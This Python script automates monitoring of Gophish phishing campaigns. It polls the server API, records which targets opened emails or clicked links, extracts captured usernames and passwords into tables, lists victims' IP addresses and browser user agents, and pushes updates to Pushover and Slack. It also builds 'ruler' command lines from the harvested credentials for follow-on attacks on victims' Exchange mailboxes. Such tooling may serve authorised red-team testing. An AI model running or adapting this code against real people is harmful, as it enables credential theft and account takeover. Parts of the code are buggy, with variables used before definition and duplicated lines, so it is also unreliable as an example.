#pip install python-pushover
import requests, json, time, sys, optparse
from pushover import Client
from tabulate import tabulate
from termcolor import colored, cprint
from ua_parser import user_agent_parser
import requests
from IPy import IP

#python gophishauto3.py -a ***REMOVED*** -i 192.168.0.180 -p 3334 -n 25,26,27,28 --push -c 

pushover_userKey='***REMOVED***'
pushover_apiToken='***REMOVED***'
client = Client(pushover_userKey, api_token=pushover_apiToken)

API_KEY ='***REMOVED***'
API_KEY = ''
tmpSelectedProjectList=[]
tmpResultPwdList=[]
lastCount=0
lastStatusCount=0
lastStatusCountList=[]
lastPwdCountList=[]
projectName=''
bold=True
firstLoopCount=0

runPushover=False
url=''
def sort_ip_list(ip_list):
  return sorted(ip_list, 
    key=lambda ip:IP(ip).int())

def setColor(message, bold=False, color=None, onColor=None):
	retVal = colored(message, color=color, on_color=onColor, attrs=("bold",))
	return retVal

def sendPushover(title,msg):
	client.send_message(msg, title=title)

def sendSlack(msg):
	#https://api.slack.com/tokens
	r = requests.post('https://hooks.slack.com/services/***REMOVED***', json={"text": msg})
	if r.status_code==200:
		return True
	else:
		return False

parser = optparse.OptionParser()
parser.add_option('-n', action="store", dest="projectID", help="Project ID")
parser.add_option('-a', '--api', action="store", dest="apiKey", help="Gophish API Key")
parser.add_option('-l', '--list', action="store_true", help="List projects")
parser.add_option('--ip', action="store_true", help="Display Public IP addresses of victims")
parser.add_option('-c', action="store_true", help="Continue looping and check for updates")
parser.add_option('--push',  action="store_true", help="Push Notifications")
parser.add_option('-i', action="store", dest="hostIP", help="Server IP")
parser.add_option('-p', action="store", dest="portNo", help="Server Port No")
loadedFile=[]
validCredList=[]

options, remainder = parser.parse_args()
if options.push:
	runPushover=True

if options.apiKey:
	API_KEY=options.apiKey
if options.hostIP and options.portNo:
	url = 'http://'+options.hostIP+':'+str(options.portNo)+'/api/campaigns/?api_key='+API_KEY
else:
	url = 'http://192.168.0.180:3333/api/campaigns/?api_key='+API_KEY
print url

resp = requests.get(url=url,verify=False)
data = resp.json()
if "Invalid API Key" in str(data):
	print "[!] Invalid Gophish API Key. Please check."
	sys.exit()

if options.list:
	resp = requests.get(url=url,verify=False)
	data = resp.json()
	tmpProjectList=[]
	for x in data:	
		if x['timeline'][0]['message']=='Campaign Created':
			tmpProjectList.append([x['id'],x['name'],x['timeline'][0]['time']])
	if len(tmpProjectList)>0:
		print tabulate(tmpProjectList,headers=['ID','Project Name','Date Created'])
		print "\n"
	sys.exit()
tmpStatusList=[]
uniqueIPListLastCount=0
tmpIPList=[]
emailOpenedCount=0
emailSuccessCount=0
capturedPwdList={}
projectCountDict={}
tmpUniqueUserAgentList=[]
tmpUniqueUACountList={}
linkClickedCountList={}
lastLinkClickedCount=0

emailOpenedCountList={}
emailSuccessCountList={}

#uniqueUAList={}

if "," in options.projectID:
	tmpSelectedProjectList=(options.projectID).split(",")
else:
	tmpSelectedProjectList.append(options.projectID)
for selectedProjectID in tmpSelectedProjectList:
	resp = requests.get(url=url,verify=False)
	data = resp.json()
	tmpProjectUserCount=0
	for x in data:
		if x['id']==int(selectedProjectID):
			projectName=x['name']
	
			capturedPwdList[projectName]=0
			emailOpenedCountList[projectName]=0
			emailSuccessCountList[projectName]=0
			tmpUniqueUACountList[projectName]=0
			linkClickedCountList[projectName]=0

			tmpResultList=(x['results'])
			for y in tmpResultList:
				if y['status']=='Email Sent' or y['status']=='Email Opened' or y['status']=='Success' or y['status']=='Email Opened':
					tmpProjectUserCount+=1		
			projectCountDict[projectName]=tmpProjectUserCount		
while 1:
	resp = requests.get(url=url,verify=False)
	data = resp.json()
	for selectedProjectID in tmpSelectedProjectList:
		for x in data:
			if x['id']==int(selectedProjectID):
				emailOpenedCount=0
				emailSuccessCount=0

				projectName=x['name']
				tmpResultList=(x['results'])
				print "\n"
				for k, v in x.items():
					if k=='timeline':
					    for y in v:
					    	try:
						    	if y['details']:
						    		#print type(y['details'])						    		
						    		resultsx=y['details']
						    		datax = json.loads(resultsx)
						    		if datax['payload']['username']:
							    		tmpEmail=y['email']
							    		username=datax['payload']['username'][0]
							    		password=datax['payload']['password'][0]
							    		try:
							    			tmpUserAgent=datax['browser']['user-agent']
										if [projectName,x['id'],tmpEmail,tmpUserAgent] not in tmpUniqueUserAgentList:
											tmpUniqueUserAgentList.append([projectName,x['id'],tmpEmail,tmpUserAgent])

								    	except Exception as e:
								    		print e
								    		pass
									if [projectName,y['email'],username,password] not in tmpResultPwdList:
										tmpResultPwdList.append([projectName,y['email'],username,password])
										if runPushover==True and firstLoopCount>0:
											tmpMsg=username
											sendPushover("Captured Credentials - "+projectName,tmpMsg)
						except KeyError:
						    	pass

				lastLinkClickedCount=linkClickedCountList[projectName]
				for y in tmpResultList:
					if y['status']=='Success' or y['status']=='Email Opened':
						if [projectName,y['email'],y['status'],y['ip']] not in tmpStatusList:
							tmpStatusList.append([projectName,y['email'],y['status'],y['ip']])
						if y['status']=='Email Opened':
							emailOpenedCount+=1
						if y['status']=='Success':
							emailSuccessCount+=1

				currentEmailOpenCount=0
				currentEmailClickCount=0
				for x in tmpStatusList:
					if x[0]==projectName:
						if x[2]=="Email Opened":
							currentEmailOpenCount+=1
						if x[2]=="Success":
							currentEmailClickCount+=1

				if len(tmpResultPwdList)>capturedPwdList[projectName] or currentEmailOpenCount>emailOpenedCountList[projectName] or currentEmailClickCount>emailSuccessCountList[projectName]:
					# and (emailOpenedCountList[projectName]!=0 and emailSuccessCountList[projectName]!=0):
					#if emailOpenedCount>emailOpenedCountList[projectName] or emailSuccessCount>emailSuccessCountList[projectName]:
					message='\n*** Results from Gophish Campaign - '+projectName+' ***'
					print(setColor(message, bold, color="red"))

					emailOpenedCount=emailOpenedCountList[projectName]
					emailSuccessCount=emailSuccessCountList[projectName]

					tmpMsg=''
					tmpEmailOpenedList=[]
					tmpLinkClickedList=[]
					for x in tmpStatusList:
						if x[0]==projectName:
							if "Email Opened" in x[2]:
								if x[1] not in tmpEmailOpenedList:
									tmpEmailOpenedList.append(x[1])
							if "Success" in x[2]:
								if x[1] not in tmpLinkClickedList:
									tmpLinkClickedList.append(x[1])	
					tmpMsg='[*] Users who read the email\n'
					if len(tmpEmailOpenedList)>emailOpenedCountList[projectName]:
						tmpResultList2=[]
						tmpResultList=tmpEmailOpenedList[emailOpenedCountList[projectName]:len(tmpEmailOpenedList)]						
						print "[*] List of users who read the email"
						for x in tmpEmailOpenedList:
							if x not in tmpResultList:
								tmpResultList2.append([x])
							else:
								tmpResultList2.append([x])
								#tmpMsg+='[new] '+x+'\n'
								tmpMsg+=x+'\n'
						for x in tmpLinkClickedList:
							if x not in tmpResultList:
								tmpResultList2.append([x])
							else:
								tmpResultList2.append([x])
								tmpMsg+=x+'\n'
								tmpMsg+=x+'\n'
						if runPushover==True and firstLoopCount>0:
								sendPushover("Campaign Status : "+projectName,tmpMsg)
								sendSlack(tmpMsg)
						#emailOpenedCountList[projectName]=len(tmpEmailOpenedList)

					tmpMsg='[*] Users who click the link\n'
					if len(tmpLinkClickedList)>linkClickedCountList[projectName]:
						tmpResultList2=[]
						tmpResultList=tmpLinkClickedList[linkClickedCountList[projectName]:len(tmpLinkClickedList)]						
						#print "\n[+] List of users who click the link"
						for x in tmpLinkClickedList:
							if x not in tmpResultList:
								tmpResultList2.append([x])
							else:
								tmpResultList2.append([x])
								#tmpMsg+='[new] '+x+'\n'
								tmpMsg+=x+'\n'
								if runPushover==True and firstLoopCount>0:
									sendPushover("Campaign Status : "+projectName,tmpMsg)
									sendSlack(tmpMsgHeader+"\n"+tmpMsg)
								#print '[new] '+x
						countDiff=len(tmpLinkClickedList)-linkClickedCountList[projectName]
						emailSuccessCountList[projectName]=len(tmpLinkClickedList)
						#if runPushover==True:
						#	client.send_message(tmpMsgHeader+tmpMsg, title="Phishing Victims - Commercehub - Clicked Link")

						lastStatusCountList1=lastStatusCountList
						tmpFound=False
						for y in lastStatusCountList1:
							if y[0]==selectedProjectID:
								lastStatusCountList1.remove([y[0],y[1]])
								lastStatusCountList1.append([y[0],len(tmpStatusList)])
								tmpFound=True
						if tmpFound==False:
							lastStatusCountList1.append([selectedProjectID,len(tmpStatusList)])
							lastStatusCountList=lastStatusCountList1
						else:
							lastStatusCountList=lastStatusCountList1								
						tmpMsg=''
				
						if options.ip:
							if len(tmpStatusList)>0:
								print "\n[+] List of IP addresses"
								for x in tmpStatusList:
									if x[0]==projectName:
										if x[3] not in tmpIPList:
											tmpIPList.append(x[3])
								tmpIPList=sort_ip_list(tmpIPList)
								for x in tmpIPList:			
									tmpMsg+=x+"\n"
									#print x
								if len(tmpIPList)>uniqueIPListLastCount:
									#if runPushover==True:
									#	client.send_message(tmpMsg, title=projectName+" - Unique IP List")
									for x in tmpIPList:
										print x
									uniqueIPListLastCount=len(tmpIPList)
									print "\n"
					tmpResultPwdList1=[]
					tmpMsg=''
						
					for x in tmpResultPwdList:
						if x[0]==projectName:
							tmpMsg+=x[1]+"\n"
							tmpResultPwdList1.append([x[1],x[2],x[3]])


					tmpMsg=''
					tmpMsgHeader="[+] Campaign Status - "+projectName+"\n"
					tmpMsgHeader+='Total Targets: '+str(projectCountDict[projectName])+" (100%) \n"


					tmpClickListCount=0
					tmpList1=[]
					for x in tmpEmailOpenedList:
						if x not in tmpList1:
							tmpList1.append(x)
					for x in tmpLinkClickedList:
						if x not in tmpList1:
							tmpList1.append(x)
					emailOpenPercentage=round(float(len(tmpList1))/float(projectCountDict[projectName])*100,2)
					tmpMsgHeader+='Email Opened: '+str(len(tmpList1))+" ("+str(emailOpenPercentage)+"%)\n"

					emailSuccessPercentage=round(float(len(tmpLinkClickedList))/float(projectCountDict[projectName])*100,2)
					tmpMsgHeader+='Clicked Link: '+str(len(tmpLinkClickedList))+" ("+str(emailSuccessPercentage)+"%)\n"

					if len(tmpLinkClickedList)>len(tmpList1):
						emailUnreadPercentage=round(float(projectCountDict[projectName]-len(tmpLinkClickedList))/float(projectCountDict[projectName])*100,2)
						tmpMsgHeader+='Email Unread: '+str(projectCountDict[projectName]-len(tmpLinkClickedList))+" ("+str(emailUnreadPercentage)+"%)\n"
					else:
						emailUnreadPercentage=round(float(projectCountDict[projectName]-len(tmpList1))/float(projectCountDict[projectName])*100,2)
						tmpMsgHeader+='Email Unread: '+str(projectCountDict[projectName]-len(tmpList1))+" ("+str(emailUnreadPercentage)+"%)\n"

					credPercentage=round(float(len(tmpResultPwdList1))/float(projectCountDict[projectName])*100,2)
					tmpMsgHeader+='Credentials Captured: '+str(len(tmpResultPwdList1))+" ("+str(credPercentage)+"%)\n"

					print tmpMsgHeader

					if len(tmpResultPwdList1)>capturedPwdList[projectName]:
						tmpResultPwdList2=[]
						tmpResultList=tmpResultPwdList1[capturedPwdList[projectName]:len(tmpResultPwdList1)]
						for x in tmpResultPwdList1:
							if x not in tmpResultList:
								#tmpResultPwdList2.append(['[old]',x[0],x[1]])
								tmpResultPwdList2.append([x[0],x[1],x[2]])
							else:
								#tmpResultPwdList2.append(['[new]',x[0],x[1]])
								tmpResultPwdList2.append([x[0],x[1],x[2]])
								#tmpMsg+='[new] '+x[0]+'\n'
								tmpMsg+=x[0]+'\n'
						#print tmpMsgHeader+"\n"+tmpMsg
						print "[+] Credentials Captured from Gophish"
						#print tabulate(tmpResultPwdList2,headers=['Status','Username','Password'])
						print tabulate(tmpResultPwdList2,headers=['Email','Username','Password'])

						print "\n[+] Ruler"
						for x in tmpResultPwdList2:
							cmd="./ruler-osx64   --email "+x[0]+" -u "+x[1]+" -p '"+x[2]+"' c"
							print cmd

					if runPushover==True:
						sendPushover("Campaign Status : "+projectName,tmpMsgHeader+"\n"+tmpMsg)
						#client.send_message(tmpMsgHeader+"\n"+tmpMsg, title="Campaign Status : "+projectName)
						sendSlack(tmpMsgHeader+"\n"+tmpMsg)
					#xxx
					if (len(tmpEmailOpenedList)+len(tmpLinkClickedList))>emailOpenedCountList[projectName]:
						tmpResultList2=[]
						tmpResultList=tmpEmailOpenedList[emailOpenedCountList[projectName]:len(tmpEmailOpenedList)]						
						print "\n[*] List of users who read the email"
						for x in tmpEmailOpenedList:
							if x not in tmpResultList:
								tmpResultList2.append([x])
							else:
								tmpResultList2.append([x])
								#tmpMsg+='[new] '+x+'\n'
								tmpMsg+=x+'\n'
								print x
						for x in tmpLinkClickedList:
							if x not in tmpResultList:
								tmpResultList2.append([x])
							else:
								tmpResultList2.append([x])
								#tmpMsg+='[new] '+x+'\n'
								tmpMsg+=x+'\n'
								print x
						tmpResultList1=tmpLinkClickedList[linkClickedCountList[projectName]:len(tmpLinkClickedList)]						
						for x in tmpLinkClickedList:
							if x not in tmpResultList1:
								tmpResultList2.append([x])
							else:
								tmpResultList2.append([x])
								#tmpMsg+='[new] '+x+'\n'
								tmpMsg+=x+'\n'
								#print '[new] '+
								print x
						emailOpenedCountList[projectName]=len(tmpEmailOpenedList)
					#xxx
					#yyy
					tmpMsg=''
					if len(tmpLinkClickedList)>linkClickedCountList[projectName]:
						tmpResultList2=[]
						tmpResultList=tmpLinkClickedList[linkClickedCountList[projectName]:len(tmpLinkClickedList)]						
						print "\n[+] List of users who click the link"
						for x in tmpLinkClickedList:
							if x not in tmpResultList:
								tmpResultList2.append([x])
							else:
								tmpResultList2.append([x])
								#tmpMsg+='[new] '+x+'\n'
								tmpMsg+=x+'\n'
								#print '[new] '+x
								print x
						#print "\n"
						countDiff=len(tmpLinkClickedList)-linkClickedCountList[projectName]
						emailSuccessCountList[projectName]=len(tmpLinkClickedList)
					#yyy
					#zzz					
					tmpUniqueUserAgentList1=[]
					for x in tmpUniqueUserAgentList:
						if x[0]==projectName:
							if x[3] not in tmpUniqueUserAgentList1:
								tmpUniqueUserAgentList1.append(x[3])
					if len(tmpUniqueUserAgentList1)>tmpUniqueUACountList[projectName]:
						if len(tmpUniqueUserAgentList1)>0:
							print "\n[+] Unique Browser User Agents (OS Matching)"
							for x in tmpUniqueUserAgentList1:
								parsed_string = user_agent_parser.Parse(x)
								try:
									osVer=parsed_string['os']['family']+" "+parsed_string['os']['major']+"."+parsed_string['os']['minor']+"."+parsed_string['os']['patch']
									print x+" ["+osVer+"]"
								except TypeError:
									if "Windows NT 5.0" in str(x):
										print x+" [Windows 2000]"
									if "Windows NT 5.1" in str(x):
										print x+" [Windows XP]"
									if "Windows NT 5.2" in str(x):
										print x+" [Windows Server 2003]"
									if "Windows NT 6.0)" in str(x):
										print x+" [Windows Vista]"
									if "Windows NT 6.1" in str(x):
										print x+" [Windows 7]"
									if "Windows NT 6.2" in str(x):
										print x+" [Windows 8]"
							tmpUniqueUACountList[projectName]=len(tmpUniqueUserAgentList1)

					print "\n[+] Browser User Agents"
					tmpUniqueUserAgentList2=[]
					for x in tmpUniqueUserAgentList:
						if str(x[1])==str(selectedProjectID):
							tmpUniqueUserAgentList2.append([x[2],x[3]])
					print tabulate(tmpUniqueUserAgentList2)
					#sys.exit()

	if not options.c:
		sys.exit()
	else:
		if firstLoopCount>0:			
			print "Sleeping for 30 seconds"
			time.sleep(30)
		else:
			firstLoopCount+=1
			print "\n"		
